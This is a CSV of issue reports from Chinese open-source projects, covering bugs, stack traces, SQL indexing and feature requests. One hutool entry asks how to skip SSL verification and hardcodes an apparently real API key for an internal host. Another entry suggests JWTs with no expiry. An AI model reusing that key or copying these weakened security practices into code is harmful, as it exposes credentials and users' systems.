title,text
Implement framework::Variable,"I am using a C++ technique called type-information hiding in this implementation. Compared with this design, my implementation doesn't use and thus doesn't rely on boost. Actually, this design relies nothing other than . Compare with Caffe2's implementation, mine doesn't use self-defined type inference mechanism like , which is defined in caffe2/core/typeid.{h,cc,test_cc}, and saved about 500 lines C++ code:   <code>: boost::any #include &lt;typeinfo&gt; caffe2::TypeMeta $ wc -l ~/work/caffe2/caffe2/core/typeid* 56 /Users/yiwang/work/caffe2/caffe2/core/typeid.cc 300 /Users/yiwang/work/caffe2/caffe2/core/typeid.h 136 /Users/yiwang/work/caffe2/caffe2/core/typeid_test.cc"
Fixing script for vae demo,"Recently, I tried running the vae demo, but it did not work well. The problem is caused by the reparameterization funciton, I changed it a bit as follow: The main issue in previous script is setting paramattr as eps. What is more, reducing z_dim size may get better result. Best wishes   <code>: def reparameterization(mu, logvar): eps = data_layer(name=""noise"", size=z_dim) with mixed_layer(act=LinearActivation()) as sigma: sigma += dotmul_operator(layer_math.sqrt(layer_math.exp(logvar)), eps) return mu + sigma"
PageHelper新版本分页,新版本分页仍然是在原有基础上添加（如果不容易整合就独立）。 新版分页特定是通过参数配置（方法优先于方法）来控制在上拦截支持二级缓存。 或者是在上拦截（实现简单）但是不支持二级缓存。 mybatis二级缓存隐藏的危险大于他带来的好处，因此不支持二级缓存不是一个问题。 正确处理缓存的方式是在业务层进行处理！   <code>: setProperties plugin Executor StatementHandler
数据库建表语句存在过多索引问题,"版本号： v3.1.0 sys_user 表对 username 字段同时建立唯一索引和普通索引，idx_su_username应该没有用，应该可以删除，其实表也有相关问题如sys_depart等   <code>: PRIMARY KEY (`id`) USING BTREE, UNIQUE KEY `uniq_sys_user_work_no` (`work_no`) USING BTREE, UNIQUE KEY `uniq_sys_user_username` (`username`) USING BTREE, UNIQUE KEY `uniq_sys_user_phone` (`phone`) USING BTREE, UNIQUE KEY `uniq_sys_user_email` (`email`) USING BTREE, KEY `idx_su_username` (`username`) USING BTREE, KEY `idx_su_status` (`status`) USING BTREE, KEY `idx_su_del_flag` (`del_flag`) USING BTREE ) ENGINE=InnoDB DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='用户表';"
table-2.8.0，数据行合并列通过table.init方法渲染后错位问题,"版本：2.8.0 描述：上图问看题   <code>: &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta name=""renderer"" content=""webkit|ie-comp|ie-stand""&gt; &lt;meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"" /&gt; &lt;title&gt;layui.table&lt;/title&gt; &lt;link rel=""stylesheet"" type=""text/css"" href=""/layui-2.8.0/css/layui.css""&gt; &lt;script type=""text/javascript"" src=""/layui-2.8.0/layui.js""&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;渲染效果：&lt;/h1&gt; &lt;table class=""layui-table"" lay-filter=""test"" id=""test"" style=""text-align: center; width: 400px;""&gt; &lt;thead&gt; &lt;tr&gt; &lt;th lay-data=""{field:'a1',align:'center',width:100}"" rowspan=""2""&gt;地区&lt;/th&gt; &lt;th lay-data=""{field:'a2',align:'center',width:100}"" rowspan=""2""&gt;城市&lt;/th&gt; &lt;th lay-data=""{align:'center',width:200}"" colspan=""2""&gt;数据&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th lay-data=""{field:'a8',align:'center',width:100}""&gt;数据1&lt;/th&gt; &lt;th lay-data=""{field:'a9',align:'center',width:100}""&gt;数据2&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td rowspan=""3""&gt;河南&lt;/td&gt; &lt;td&gt;郑州&lt;/td&gt; &lt;td&gt;1&lt;/td&gt; &lt;td&gt;2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;洛阳&lt;/td&gt; &lt;td&gt;3&lt;/td&gt; &lt;td&gt;4&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;开封&lt;/td&gt; &lt;td&gt;5&lt;/td&gt; &lt;td&gt;6&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td rowspan=""3""&gt;辽宁&lt;/td&gt; &lt;td&gt;沈阳&lt;/td&gt; &lt;td&gt;7&lt;/td&gt; &lt;td&gt;8&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;大连&lt;/td&gt; &lt;td&gt;9&lt;/td&gt; &lt;td&gt;10&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;鞍山&lt;/td&gt; &lt;td&gt;11&lt;/td&gt; &lt;td&gt;12&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;hr&gt; &lt;h1&gt;实际效果：&lt;/h1&gt; &lt;table width=""400"" border=""1"" cellspacing=""0"" style=""text-align:center""&gt; &lt;tr&gt; &lt;td rowspan=""2""&gt;城市&lt;/td&gt; &lt;td rowspan=""2""&gt;地区&lt;/td&gt; &lt;td colspan=""2""&gt;数据&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;数据1&lt;/td&gt; &lt;td&gt;数据2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td rowspan=""3""&gt;河南&lt;/td&gt; &lt;td&gt;郑州&lt;/td&gt; &lt;td&gt;1&lt;/td&gt; &lt;td&gt;2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;洛阳&lt;/td&gt; &lt;td&gt;3&lt;/td&gt; &lt;td&gt;4&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;开封&lt;/td&gt; &lt;td&gt;5&lt;/td&gt; &lt;td&gt;6&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td rowspan=""3""&gt;辽宁&lt;/td&gt; &lt;td&gt;沈阳&lt;/td&gt; &lt;td&gt;7&lt;/td&gt; &lt;td&gt;8&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;大连&lt;/td&gt; &lt;td&gt;9&lt;/td&gt; &lt;td&gt;10&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;鞍山&lt;/td&gt; &lt;td&gt;11&lt;/td&gt; &lt;td&gt;12&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;script&gt; var table = layui.table; table.init('test',{width:'500px'}); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;"
TOKEN刷新及管理方式,"版本号：2.1.1 JWT生成的token，不一定要设置过期时间，不使用withExpiresAt 方法，只是让token携带一定的user的信息，token过期时间让redis来管理就可以了，当前请求访问完成刷新token在redis中缓存的时间即可 详细可看下 https://gitee.com/zjm16/zjmzxfzhl ，这个架构很多也是参考jeecg-boot内容开发架构的 问题截图：无   <code>: public static String sign(String userId, String secret, Date date) { Algorithm algorithm = Algorithm.HMAC256(secret); if (date != null) { // 如果有传过期时间，则加入过期时间 return JWT.create().withClaim(""userId"", userId).withExpiresAt(date).sign(algorithm); } else {// 不设置过期时间，可以使用redis等缓存来管理过期时间 return JWT.create().withClaim(""userId"", userId).withClaim(""date"", DateUtil.getNow()).sign(algorithm); } } public boolean verifyTokenWithRedis(String token, String userId, String password) { String userTokenKey = Constants.PREFIX_USER_TOKEN + userId; // 校验token有效性，若验证通过，刷新token缓存时间 if (token.equals(redisUtil.get(userTokenKey)) &amp;&amp; JwtUtil.verify(token, userId, password)) { redisUtil.expire(userTokenKey, JwtUtil.EXPIRE_TIME); redisUtil.expire(Constants.PREFIX_USER_SESSION_OBJECT + userId, JwtUtil.EXPIRE_TIME); return true; } return false; }"
Rename `AsNoGradient` of VariableBuilder to `NotInGradient`,fix #3539:Feature/extract op info into op info.cc change to   <code>: AsNoGradient() NotInGradient()
FIX: propagation dependencies and rebuild out of date libs,"Pain points: When I implemented buddy allocator, finally I want to merge all small pieces libraries to for testing memory recycling effects. I found the original generic implementation doesn't allow propagation dependencies and also cannot track out of date records. The new features for merging static libraries. propagation dependencies rebuild the out of date static library   <code>: paddle_memory if(${WITH_GPU}) nv_library(system_allocator SRCS system_allocator.cc DEPS gflags cpu_info gpu_info) else(${WITH_GPU}) cc_library(system_allocator SRCS system_allocator.cc DEPS gflags cpu_info) endif(${WITH_GPU}) cc_test(system_allocator_test SRCS system_allocator_test.cc DEPS system_allocator) cc_library(meta_data SRCS meta_data.cc) cc_library(meta_cache SRCS meta_cache.cc) cc_library(memory_block SRCS memory_block.cc) cc_library(buddy_allocator SRCS buddy_allocator.cc DEPS glog) cc_library(memory SRCS memory.cc) cc_library(paddle_memory DEPS memory meta_data meta_cache memory_block buddy_allocator system_allocator) cc_test(memory_test SRCS memory_test.cc DEPS place paddle_memory)"
使用layui treetable组件时，定时刷新时会将子节点变换成父节点,"版本：2.8.0-beta.3 描述：使用layui treetable组件时，定时刷新时会将子节点变换成父节点 layui.use(['table', 'form', 'jquery', 'treetable'], function() { let table = layui.table; let form = layui.form; let $ = layui.jquery; let treetable = layui.treetable;   <code>: var t1 = window.setInterval(cz, 5000); let MODULE_PATH = ""operate/""; function cz() { layui.use(['table'], function() { table.reloadData('power-table', { url: javaapiUrl + ""/detectorData/redisbenanDetectorDatasTable"", //数据接口 scrollPos: 'fixed', }); }) } window.render = function() { // let data; treetable.render({ treeColIndex: 1, treeSpid: 0, treeIdName: 'powerId', treePidName: 'parentId', skin: 'line', treeDefaultClose: true, elem: '#power-table', // data: data, url: javaapiUrl + ""/detectorData/redisbenanDetectorDatasTable"", page: false, parseData: function(res) { let objk = { ""code"": 0, //解析接口状态 ""msg"": res.message, //解析提示文本 ""count"": res.result.length, //解析数据长度 ""data"": res.result, //解析数据列表 }; console.log('数据转换', res); return objk }, cols: [ [{ type: 'checkbox' }, { field: 'shopname', minWidth: 200, title: '车间名' }, { field: 'controlname', title: '传感器名', }, { field: 'gastype', title: '气体类型', }, { field: 'detectorconcentration', title: '实时数据', }, { field: 'unit', title: '气体单位', }, { field: 'now', title: '检测时间', }, ] ], done: function(d) { console.log('done', d); } }); }"
ZipUtil解压时不支持压缩包中带有中文的文件。,"我指定编码或者默认都不可以! 堆栈为： version 4.0.4   <code>: File unzip = ZipUtil.unzip(""E:\\测试.zip"", CharsetUtil.GBK); java.lang.IllegalArgumentException: MALFORMED at java.util.zip.ZipCoder.toString(ZipCoder.java:58) at java.util.zip.ZipFile.getZipEntry(ZipFile.java:583) at java.util.zip.ZipFile.access$900(ZipFile.java:60) at java.util.zip.ZipFile$ZipEntryIterator.next(ZipFile.java:539) at java.util.zip.ZipFile$ZipEntryIterator.nextElement(ZipFile.java:514) at java.util.zip.ZipFile$ZipEntryIterator.nextElement(ZipFile.java:495) at cn.hutool.core.util.ZipUtil.unzip(ZipUtil.java:387) at cn.hutool.core.util.ZipUtil.unzip(ZipUtil.java:351) at cn.hutool.core.util.ZipUtil.unzip(ZipUtil.java:338)"
在GPU静态图模式下，如何得到终止索引可变的切片？,"这个NMS_with_angle的Cell在GPU静态图模式下运行，会报如下错误： TypeError: mindspore/ccsrc/runtime/device/gpu/kernel_info_setter.cc:412 PrintUnsupportedTypeException] Select GPU kernel op[StridedSlice] fail! Incompatible data type! The supported data types are input[Float64], output[Float64]; input[Float32], output[Float32]; input[Float16], output[Float16]; input[Int64], output[Int64]; input[Int32], output[Int32]; input[Int16], output[Int16]; input[Int8], output[Int8]; input[UInt64], output[UInt64]; input[UInt32], output[UInt32]; input[UInt16], output[UInt16]; input[UInt8], output[UInt8]; input[Bool], output[Bool]; , but get input[Int64 Int64 Int64 Int64 ] output[Int64 ] 由op返回的num的值是可变的，因此切片无法使用常量去完成。idx和num的shape均在注释中写出。请问，能帮忙分析一下报错原因或者有什么方法能完成切片吗？   <code>: class NMS_with_angle(Cell): def __init__(self, IOU_threshold=0.5): super(NMS_with_angle, self).__init__() self.IOU_threshold = Tensor(IOU_threshold, dtype=mstype.float32) self.sort = ops.Sort(axis=0, descending=True) self.slice = ops.Slice() self.gather = ops.Gather() def construct(self, bbox, score): """""" params: bbox: (N, 5) [x1, y1, x2, y2, ry] score: (N,) return: indices: (M,) whose iou_value is lower than threshold """""" N, _ = bbox.shape _, score_sorted = self.sort(score) # (N,) bbox = bbox[score_sorted] op = ops.Custom(""./NMSWithAngle.so:NMS_WITH_ANGLE"", out_shape=((N,),(1,)), out_dtype=(mstype.int64, mstype.int64), func_type=""aot"") idx, num = op(self.IOU_threshold ,bbox) # (N,), int64. (1,), int64. return score_sorted[idx[:num[0]]]"
Compiling failure in Custom Op,"Compiling failure in Custom Op / 硬件环境: /device gpu : -- MindSpore version : r1.6 -- Python version : Python 3.7.5 -- OS platform and distribution : Linux -- GCC/Compiler version : N/A (/): /mode graph Run the above codes Compiling succeeds. TVMError: Check failed: !var_idmap_.count(v): Need input to be in SSA form dup input_0   <code>: import numpy as np from mindspore import context, Tensor, ms_function import mindspore.ops as ops from mindspore.ops.operations._ms_hybrid import ms_hybrid context.set_context(device_target=""GPU"") @ms_hybrid def add(a, b): c = output_tensor((2, 2), ""float32"") for i0 in range(a.shape[0]): for i1 in range(a.shape[1]): c[i0, i1] = a[i0, i1] + b[i0, i1] return c op = ops.Custom(add) @ms_function def ms_net(x): return op(x, x) if __name__ == ""__main__"": op = ops.Custom(add) x0 = np.array([[0.0, 0.0], [1.0, 1.0]]).astype(np.float32) output = ms_net(Tensor(x0)) print(output)"
自己想实现batchUpdate 但是报错了，请各位帮忙看看,"这个是我的测试代码(运行batchupdate) 报错信息如下: 目前我在工作中经常用户批量修改功能,也就是根据id修改某个字段或者多个字段 我参照你的InsertListMapper 写了一个BatchUpdateMapper,运行不成功,代码如下 最后请大神,在百忙之中,帮我解决这个问题 谢谢   <code>: SqlSession sqlSession = MybatisHelper.getSqlSession(); try { CountryMapper mapper = sqlSession.getMapper(CountryMapper.class); List&lt;Country&gt; countryList = mapper.selectAll(); //查询总数 countryList.forEach(country -&gt; country.setCountryname(""修改了"")); countryList = countryList.subList(0, 3); mapper.batchUpdate(countryList); mapper.insertList(countryList); List&lt;Country&gt; countries = mapper.selectAll(); Assert.assertEquals(183, countryList.size()); } finally { sqlSession.close(); } org.apache.ibatis.exceptions.PersistenceException: ### Error updating database. Cause: java.sql.SQLSyntaxErrorException: unexpected token: UPDATE : line: 6 ### SQL: UPDATE country SET countryname = ?,countrycode = ? WHERE id = ? ; UPDATE country SET countryname = ?,countrycode = ? WHERE id = ? ; UPDATE country SET countryname = ?,countrycode = ? WHERE id = ? ### Cause: java.sql.SQLSyntaxErrorException: unexpected token: UPDATE : line: 6 at org.apache.ibatis.exceptions.ExceptionFactory.wrapException(ExceptionFactory.java:23) at org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:150) at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:49) at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:43) at com.sun.proxy.$Proxy15.batchUpdate(Unknown Source) at tk.mybatis.mapper.test.country.TestSelectAll.testDynamicSelectPage(TestSelectAll.java:57) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:47) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:44) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:271) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:70) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:50) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:238) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:63) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:236) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:53) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:229) at org.junit.runners.ParentRunner.run(ParentRunner.java:309) at org.junit.runner.JUnitCore.run(JUnitCore.java:160) at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:69) at com.intellij.rt.execution.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:234) at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:74) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at com.intellij.rt.execution.application.AppMain.main(AppMain.java:144) Caused by: java.sql.SQLSyntaxErrorException: unexpected token: UPDATE : line: 6 at org.hsqldb.jdbc.Util.sqlException(Unknown Source) at org.hsqldb.jdbc.Util.sqlException(Unknown Source) at org.hsqldb.jdbc.JDBCPreparedStatement.&lt;init&gt;(Unknown Source) at org.hsqldb.jdbc.JDBCConnection.prepareStatement(Unknown Source) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.apache.ibatis.logging.jdbc.ConnectionLogger.invoke(ConnectionLogger.java:50) at com.sun.proxy.$Proxy16.prepareStatement(Unknown Source) at org.apache.ibatis.executor.statement.PreparedStatementHandler.instantiateStatement(PreparedStatementHandler.java:70) at org.apache.ibatis.executor.statement.BaseStatementHandler.prepare(BaseStatementHandler.java:82) at org.apache.ibatis.executor.statement.RoutingStatementHandler.prepare(RoutingStatementHandler.java:54) at org.apache.ibatis.executor.SimpleExecutor.prepareStatement(SimpleExecutor.java:70) at org.apache.ibatis.executor.SimpleExecutor.doUpdate(SimpleExecutor.java:44) at org.apache.ibatis.executor.BaseExecutor.update(BaseExecutor.java:100) at org.apache.ibatis.executor.CachingExecutor.update(CachingExecutor.java:75) at org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:148) ... 30 more Caused by: org.hsqldb.HsqlException: unexpected token: UPDATE : line: 6 at org.hsqldb.error.Error.parseError(Unknown Source) at org.hsqldb.ParserBase.unexpectedToken(Unknown Source) at org.hsqldb.ParserCommand.compileStatement(Unknown Source) at org.hsqldb.Session.compileStatement(Unknown Source) at org.hsqldb.StatementManager.compile(Unknown Source) at org.hsqldb.Session.execute(Unknown Source) ... 46 more package tk.mybatis.mapper.common.special; import org.apache.ibatis.annotations.UpdateProvider; import tk.mybatis.mapper.provider.SpecialProvider; import java.util.List; public interface BatchUpdateMapper&lt;T&gt; { @UpdateProvider(type = SpecialProvider.class, method = ""dynamicSQL"") int batchUpdate(List&lt;T&gt; recordList); } package tk.mybatis.mapper.provider; import org.apache.ibatis.mapping.MappedStatement; import tk.mybatis.mapper.entity.EntityColumn; import tk.mybatis.mapper.mapperhelper.EntityHelper; import tk.mybatis.mapper.mapperhelper.MapperHelper; import tk.mybatis.mapper.mapperhelper.MapperTemplate; import tk.mybatis.mapper.mapperhelper.SqlHelper; import java.util.Set; import java.util.regex.Matcher; import java.util.regex.Pattern; /** * SpecialProvider实现类，特殊方法实现类 * * @author liuzh */ public class SpecialProvider extends MapperTemplate { public SpecialProvider(Class&lt;?&gt; mapperClass, MapperHelper mapperHelper) { super(mapperClass, mapperHelper); } public String batchUpdate(MappedStatement ms) { final Class&lt;?&gt; entityClass = getEntityClass(ms); //开始拼sql StringBuilder sqlSB = new StringBuilder(); sqlSB.append(""&lt;foreach collection=\""list\"" item=\""record\"" open=\""\"" close=\""\"" separator=\"";\"" &gt;""); sqlSB.append(SqlHelper.updateTable(entityClass, tableName(entityClass))); String updateSetColumnsStr = SqlHelper.updateSetColumns(entityClass, null, true, isNotEmpty()); updateSetColumnsStr = replaceUpdateSetStr(updateSetColumnsStr); sqlSB.append(updateSetColumnsStr); sqlSB.append(SqlHelper.wherePKColumns(entityClass)); sqlSB.append(""&lt;/foreach&gt;""); String sql = sqlSB.toString(); sql = sql.replaceAll(""#\\{"", ""#{record.""); return sql; } private String replaceUpdateSetStr(String str) { String regexStr = ""&lt;if test=\""(\\w+) != null and \\1 != '' \""&gt;""; Pattern pattern = Pattern.compile(regexStr); Matcher matcher = pattern.matcher(str); StringBuffer sb = new StringBuffer(); while (matcher.find()) { matcher.appendReplacement(sb, ""&lt;if test=\""record.$1 != null and record.$1 != '' \""&gt;""); } matcher.appendTail(sb); return sb.toString(); }"
HttpRequest如何跳过SSL,"JDK版本： jdk11 hutool版本： 5.8.8 现在的版本如何跳过SSL验证 cn.hutool.core.io.IORuntimeException: SSLHandshakeException: Failed to parse server certificates Caused by: javax.net.ssl.SSLHandshakeException: Failed to parse server certificates Caused by: java.security.cert.CertificateParsingException: Empty issuer DN not allowed in X509Certificates   <code>: public void test(){ String body = HttpRequest.get(""https://10.111.10.58:9443/api/endpoints/2/docker/version"") .header(""X-API-Key"", ""ptr_KGBARfxFJH5TcKr5e2EFZyxs+A3zfxNtRQMzJuNbwEg="") .execute().body(); }"
发现jpress一个特别搞笑的bug,"版本:最新版本 情况说明:一般情况下发生在页面源码编辑添加tab选项卡,比如   <code>: &lt;ul class=""xx""&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;/ul&gt; 保存后硬给自动改成了 &lt;ul &gt; &lt;li class=""xx""&gt;1&lt;/li&gt; &lt;li class=""xx""&gt;2&lt;/li&gt; &lt;/ul&gt; 该功能百发百中"
[CT][MS][pynative]test_pynative_change_requires_grad_in_construct Segmentation fault,Segmentation fault / 硬件环境: /device ascend : -- MindSpore version :master-46392 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative test_pynative_change_requires_grad_in_construct pytest -s pynative/test_pynative_syntax.py::test_pynative_change_requires_grad_in_construct case pass   <code>: ../pynative/test_pynative_syntax.py::test_pynative_return_list_in_construct PASSED [ 67%] ../pynative/test_pynative_syntax.py::test_pynative_return_bool_and_scalar_in_construct PASSED [ 68%] ../pynative/test_pynative_syntax.py::test_pynative_return_nothing_in_construct PASSED [ 70%] ../pynative/test_pynative_syntax.py::test_pynative_change_requires_grad_in_construct Fatal Python error: Segmentation fault
data属性设置json字符串 + @Body参数的情况下报NullPointerException,"在AbstractBodyBuilder 109行 当bodyItem instanceof NameValueRequestBody时，jsonMap有初始化 当bodyItem instanceof StringRequestBody时，jsonMap未初始化，导致NullPointerException   <code>: java.lang.NullPointerException at com.dtflys.forest.backend.body.AbstractBodyBuilder.buildBody(AbstractBodyBuilder.java:109) at com.dtflys.forest.backend.httpclient.executor.AbstractHttpclientExecutor.prepareBody(AbstractHttpclientExecutor.java:128) at com.dtflys.forest.backend.httpclient.executor.AbstractHttpclientExecutor.prepare(AbstractHttpclientExecutor.java:77) at com.dtflys.forest.backend.httpclient.executor.AbstractHttpclientExecutor.execute(AbstractHttpclientExecutor.java:154) at com.dtflys.forest.http.ForestRequest.execute(ForestRequest.java:1687) at com.dtflys.forest.http.ForestRequest.execute(ForestRequest.java:1704) at com.dtflys.forest.reflection.ForestMethod.invoke(ForestMethod.java:1175) @Post(url = ""https://api.tt.com/predict"", contentType = ""application/json"", data = ""{'username':'123', 'password':'321'}"") JSONObject getCode(@Body(""typeid"") String typeid); if (bodyItem instanceof NameValueRequestBody) { if (jsonMap == null) { jsonMap = new LinkedHashMap&lt;&gt;(bodyList.size()); } jsonMap.put(((NameValueRequestBody) bodyItem).getName(), ((NameValueRequestBody) bodyItem).getValue()); } else if (bodyItem instanceof StringRequestBody) { String content = bodyItem.toString(); Map subMap = null; try { subMap = jsonConverter.convertObjectToMap(content); } catch (Throwable th) {} if (subMap != null) { jsonMap.putAll(subMap); } else { if (jsonArray == null) { jsonArray = new LinkedList&lt;&gt;(); } jsonArray.add(content); } }"
登录页密码输入框点击显示密码,"类似图中所示，点击眼睛图标显示密码明文 使用如下代码样式有问题， css   <code>: &lt;div class=""input-group""&gt; &lt;input class=""form-control pword"" id=""pass"" name=""pass"" placeholder=""密码"" type=""password""/&gt; &lt;span class=""input-group-addon"" title=""登录密码,鼠标按下显示密码"" onmousedown=""$('#pass').attr('type','text')"" onmouseup=""$('#pass').attr('type','password')""&gt;&lt;i class=""fa fa-key""&gt;&lt;/i&gt; &lt;/span&gt; &lt;/div&gt;"
MDI子窗体有3D效果，能否增加一个属性来开关3D效果？,"添加一个属性，然后根据属性来选择是否屏蔽3D效果（无法实时预览，运行后会被自动移除）   <code>: [DllImport(""user32.dll"")] static extern long GetWindowLong(IntPtr hWnd, int nIndex); [DllImport(""user32.dll"")] static extern long SetWindowLong(IntPtr hWnd, int nIndex, long value); private void Form1_Load(object sender, EventArgs e) { foreach (Control c in this.Controls) { if (c is MdiClient) { IntPtr h = c.Handle; SetWindowLong(h, -16, GetWindowLong(h, -16) &amp; ~0x00800000L); SetWindowLong(h, -20, GetWindowLong(h, -20) &amp; ~0x00000200L); break; } } }"
html中自动生成的字段，如不想让显示，不能直接去掉，怎么能隐藏？列表中字典回显，写法也有问题。,"我这样做，显示“正在努力地加载数据中，请稍候……”   <code>: { field: 'clinetsex', title: '客户性别', formatter: function(value, row, index) { return $.table.selectDictLabel(sys_user_sex, value); } }, }; $.table.init(options); $.table.hideColumn(""client""); });"
[MD] Add missing ImageBatchFormat to dataset/vision/__init__.py,"Add missing ImageBatchFormat init py ImageBatchFormat is missing from dataset/vision/init.py Thus results in ImportError: cannot import name 'ImageBatchFormat' from 'mindspore.dataset.vision' ImageBatchFormat needs to be added dataset/vision/init.py so that the import is successful A workaround is the following, to import directly from utils   <code>: from mindspore.dataset.vision.utils import Border, ImageBatchFormat, Inter from mindspore.dataset.vision.utils import Border, ImageBatchFormat, Inter"
dataset: add c++ data augmentation op and try think scheme to support user define,"RFC In common case, op implemented in c++ layer has better performance than python layer. currently, MindData does not support user to define c++ op, thus we want to enable this way. Task Goal 1) way for add some c++ operation op we can analysis the general way that add c++ data augmentation op like in pr: 3 month ago，add invert: !3077:supporting cpp invert operation 12.14 add NormalizePad: !9910:[MD][Perf] MindData add NormalizePad for GPU performance check the current supported c++ op list in website: https://www.mindspore.cn/doc/api_python/zh-CN/r1.0/mindspore/mindspore.dataset.vision.html#module-mindspore.dataset.vision.c_transforms think the common used op, find one or two that are not included in op list; and try implement it, and raise pr. some suggested op you can try are as follows: already implemented in py_transform, but not in c_transform common used, like gaussian process operation, like and some common used function in numpy, like: the lite op is greatly need, these op will be used in lite device like phone, watch ects: 2) way for try thinking out schema that better support user define we can analysis the general way that add c++ data augmentation op like in pr: !3077:supporting cpp invert operation and we can refer some meteraia like: how pytorch do this： https://zhuanlan.zhihu.com/p/158643792 supported way should be convenient, for example: we want to write the key part code like op1.cc op1.h, and op registed in automaticly in other file like with running a script. based on proposed way, and add an simple op to verify above supported way(can find one implemented in py_transform but not in c_transform). Way for Discussion If you have question or problems, please comment in this issue.   <code>: GaussianNoise，GaussianFilter np.rot90, np.clip Canny minMaxLoc exp max sobel countNonZero ..."
